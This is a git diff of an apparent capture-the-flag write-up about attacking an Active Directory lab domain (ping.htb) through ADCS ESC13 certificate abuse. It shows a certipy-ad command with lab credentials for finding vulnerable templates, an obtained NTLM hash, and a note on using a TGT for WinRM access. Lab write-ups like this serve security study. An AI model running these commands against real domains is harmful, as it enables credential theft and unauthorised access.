@@ -227,7 +227,7 @@ From this output i can see bloodyAD detects a trust, but since the machine is li
 
 And after ingesting this i see there is a trust between the two domains
 
-# ADCS (ESC13)
+# ADCS (ESC13) leads to access over WINRM
 
 ```python
 ❯❯❯ faketime -f +8h certipy-ad find -dc-ip 10.129.245.56 -dc-host dc1.ping.htb -target dc1.ping.htb -target-ip 10.129.245.56 -u c.roberts -p 'AssumedBreach123' -k -enabled -stdout -vulnerable
@@ -337,4 +337,8 @@ File 'c.roberts.ccache' already exists. Overwrite? (y/n - saying no will save wi
 [*] Got hash for 'c.roberts@ping.htb': aad3b435b51404eeaad3b435b51404ee:2475be69d40e815588a85fd89c7a439d
 ```
 
-T
+Then ill auth with it, i now have a TGT that contains the authentication info to connect over WINRM
+
+```python
+
+```
